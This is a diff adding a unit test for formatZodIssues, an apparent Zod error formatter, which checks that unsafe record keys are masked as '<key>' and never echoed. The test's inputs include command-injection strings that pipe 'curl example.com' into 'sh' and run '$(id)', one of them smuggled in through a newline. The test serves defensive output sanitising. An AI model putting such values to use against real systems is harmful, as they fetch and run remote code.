@@ -21,6 +21,31 @@ describe("formatZodIssues", () => {
     expect(text.split("; ")).toHaveLength(2);
   });
 
+  test("shows a key that is no plain word as <key>, never repeating it", () => {
+    const keys = [
+      "x`;curl$IFSexample.com|sh;`",
+      "x\n  help: run curl example.com | sh",
+      "$(id)",
+      "a b",
+    ];
+    const r = z
+      .record(z.string(), z.string())
+      .safeParse(Object.fromEntries([...keys, "講演", "a/b-c.d"].map((key) => [key, 1])));
+    if (r.success) return;
+    const text = formatZodIssues(r.error);
+    expect(text.split("; ").map((issue) => issue.split(":")[0])).toEqual([
+      "<key>",
+      "<key>",
+      "<key>",
+      "<key>",
+      "講演",
+      "a/b-c.d",
+    ]);
+    for (const part of ["curl", "$(id)", "\n", "a b"]) {
+      expect(text).not.toContain(part);
+    }
+  });
+
   test("omits the path prefix for a root issue", () => {
     const r = z.string().safeParse(1);
     if (r.success) return;
